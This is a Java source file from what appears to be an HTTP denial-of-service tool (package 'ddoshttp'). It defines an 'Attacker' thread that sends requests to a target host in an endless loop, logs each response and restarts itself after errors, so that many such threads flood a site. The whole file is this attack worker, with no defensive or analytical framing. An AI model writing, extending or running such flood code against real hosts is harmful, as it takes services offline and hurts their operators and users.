package ua.cc.lajdev.ddoshttp.worker;

import ua.cc.lajdev.ddoshttp.DemoApplication;
import lombok.Builder;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.ZoneId;


@Builder
public class Attacker extends Thread {

    private final String hostName;

    @Override
    public void run() {
        connect();
    }

    private void connect() {
        try {
            while (true) {
                HttpURLConnection connection = (HttpURLConnection) new URL(hostName).openConnection();
                String format = String.format("%s - %s, %s - %s", LocalDateTime.now(ZoneId.systemDefault()), hostName, connection.getResponseCode(), connection.getResponseMessage());
                System.out.println(format);
            }
        } catch (IOException e) {
            printError(e.getMessage());
            connect();
        } catch (Exception e) {
            printError(e.getMessage());
        }
    }

    private void printError(String message) {
        DemoApplication.printConsole(String.format("%s: Attack aborted. %s", hostName, message));
    }
}
